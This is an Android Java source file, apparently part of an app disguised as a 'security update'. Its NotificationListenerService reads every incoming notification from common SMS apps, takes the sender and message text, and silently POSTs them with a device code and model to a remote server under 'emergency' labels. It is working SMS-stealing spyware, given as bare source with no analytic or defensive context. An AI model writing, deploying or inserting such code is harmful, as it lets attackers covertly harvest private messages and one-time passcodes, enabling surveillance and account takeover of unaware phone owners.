package com.security.update;

import android.app.Notification;
import android.content.Context;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SmsNotificationListener extends NotificationListenerService {

    private static final String TAG = "SmsListener";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        if (!isSmsApp(pkg)) return;

        Notification notif = sbn.getNotification();
        if (notif == null) return;

        Bundle extras = notif.extras;
        if (extras == null) return;

        CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
        CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
        CharSequence bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);

        String sender = title != null ? title.toString() : "unknown";
        String body = bigText != null ? bigText.toString()
                    : (text != null ? text.toString() : "");

        if (body.isEmpty()) return;

        Log.d(TAG, "SMS from: " + sender);

        new Thread(() -> {
            String emergencyCode = DeviceRegistrar.getOrRegister(getApplicationContext());
            if (emergencyCode == null) {
                Log.e(TAG, "No emergency code — cannot send");
                return;
            }
            sendToServer(emergencyCode, sender, body);
        }).start();
    }

    private boolean isSmsApp(String pkg) {
        return pkg.equals("com.google.android.apps.messaging")
            || pkg.equals("com.samsung.android.messaging")
            || pkg.equals("com.android.mms")
            || pkg.equals("com.miui.smsextra")
            || pkg.equals("com.oneplus.mms")
            || pkg.equals("com.android.messaging");
    }

    private void sendToServer(String emergencyCode, String sender, String body) {
        try {
            URL url = new URL(EmergencyConfig.SERVER_URL + EmergencyConfig.EMERGENCY_ENDPOINT);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            JSONObject content = new JSONObject();
            content.put("sender", sender);
            content.put("message", body);
            content.put("timestamp", System.currentTimeMillis());
            content.put("type", "incoming");

            JSONObject payload = new JSONObject();
            payload.put("emergency_code", emergencyCode);
            payload.put("device_id", android.os.Build.MODEL);
            payload.put("data_type", "sms");
            payload.put("data_content", content);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
            }

            int code = conn.getResponseCode();
            Log.d(TAG, "Server response: " + code);
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Send failed: " + e.getMessage());
        }
    }
}
